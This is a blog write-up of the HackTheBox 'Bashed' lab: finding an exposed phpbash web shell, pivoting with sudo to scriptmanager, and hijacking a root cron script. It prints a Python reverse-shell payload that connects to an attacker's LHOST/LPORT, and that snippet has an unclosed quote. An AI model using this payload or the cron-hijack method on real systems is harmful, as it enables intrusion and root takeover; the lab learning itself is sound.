---
layout: post
title: HackTheBox&#58; Bashed
description: Writeup for HTB box Bashed.
category: HackTheBox
---

### Introduction

Bashed is a Linux box, difficulty Bashed on HTB.

The box is quite easy and straightforward.
User part is finding a running shell on the webserver.
For pivesc part, first we need to pivot from www-data to scriptmanager, then modify a script that is included in a root cron job.

### Initial Scan

![Bashed-1](/resources/Bashed-1.png)

### User: phpbash.php

The only service running is a webserver on port 80.
Based on the title of the homepage as well as the front page post, we can see this is a development site for a pseudo-bash written in php.
Furthur reading also suggests that the shell is presented somewhere in the site.

With that in mind, running `gobuster` with medium dirbuster wordlist shows a directory named `/dev`.
Here we can find `phpbash.php` and `phpbash.min.php`.
The source code for them is on [github](https://github.com/Arrexel/phpbash).

Here is the shell running as user `www-data` and we can read user.txt.
We are still going to open a reverse shell for other tasks later (`vi` for example).
![Bashed-2](/resources/Bashed-2.png)

### Privesc: scriptmanager and cron job

Running `sudo -l` shows that user `www-data` can run everything as user `scriptmanager`.
So we open a bash shell as `scriptmanager` by running
```bash
sudo -u scriptmanager bash
```

There is an unusual directory belong to `scriptmanager` at `/scripts`, containing `test.py` and `test.txt`.
Looking at the date of `test.txt`, we see that the date of `test.txt` is very new.
Furthurmore the date of `text.txt` seems to change every minute.
This highly suggests that `test.py` is executed every minute as root (because `test.txt` is owned by root).
We can also use [pspy](https://github.com/DominicBreuker/pspy) to confirm this.

We can modify the content of `test.py` to open a root reverse shell and we can read root.txt
```python
import socket
import subprocess
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((LHOST, LPORT))

os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

p = subprocess.call(["/bin/sh", "-i])
```
![Bashed-3](/resources/Bashed-3.png)
